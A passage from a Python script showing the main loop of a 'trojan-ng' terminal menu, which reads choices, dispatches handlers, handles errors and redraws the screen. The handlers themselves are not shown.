            choice = input("\n  " + c(160, "trojan-ng> ")).strip()
        except EOFError:
            break

        if choice in ("10", "0", "q", "exit"):
            clear_body()
            rainbow("  shutting down ...", 0.02)
            print()
            break

        handler = next((h for n, _, h in MENU if n == choice), None)
        if handler is None:
            clear_body()
            bad("unknown option")
            time.sleep(0.5)
            clear_body()
            draw_menu()
            continue

        clear_body()             # wipe menu, header stays
        try:
            handler()            # output appears under the header
        except KeyboardInterrupt:
            print()
            info("cancelled")
        except Exception as exc:
            bad("%s: %s" % (type(exc).__name__, exc))

        press_enter()
        clear_body()             # output gone
        draw_menu()              # fresh menu, header untouched


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n  bye")